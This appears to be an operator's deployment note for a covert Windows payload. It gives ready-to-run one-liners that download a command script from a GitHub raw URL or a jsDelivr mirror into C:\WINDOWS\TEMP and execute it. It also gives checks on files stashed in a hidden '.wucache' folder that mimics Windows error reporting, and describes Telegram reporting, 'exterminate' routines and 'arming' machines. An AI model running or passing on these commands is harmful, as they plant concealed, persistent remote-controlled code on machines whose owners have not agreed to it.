UNIVERSAL DEPLOY  (O27: T10 build-visibility + M17 alt-missing heal + L6 identity
fix + exterminate + repair ladders + S6 hardening). Works on fresh AND stuck
machines (old +h+s copies are attribute-stripped first):

  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o27" && call C:\WINDOWS\TEMP\own.cmd

Rescue (if raw is blocked on that box):

  attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L -o C:\WINDOWS\TEMP\own.cmd "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own.txt?t=o27" && call C:\WINDOWS\TEMP\own.cmd

!! DELETE any older saved one-liners (t=o18..o26). The midnight wave proved old
commands still circulate - every old build re-arms OLD bugs. Reports now show
"Payload builds: MON=.. SEC=.. TGR=.. LIB=.." + "Source build: O27" so stragglers
are instantly visible.

Wait ~3-4 min, then Telegram shows FIRST DEPLOY with ground truth:
exterminate_begin/result, identity_A..D picks, create_task + verify, msi exits,
payload builds line.

Verify on-machine:
  findstr /C:"BUILD" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_mon.cmd" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_lib.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\tg_report.ps1" "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\own_secure.cmd"
  (expect: M17 / L6 / T10 / S6)
  type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\exterminate.log"
  type "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\identity.cfg"

Fresh box = full arm. Existing box = payloads refreshed, identity regenerated,
exterminate runs, ALT restored by GUID repair, builds visible in TG.
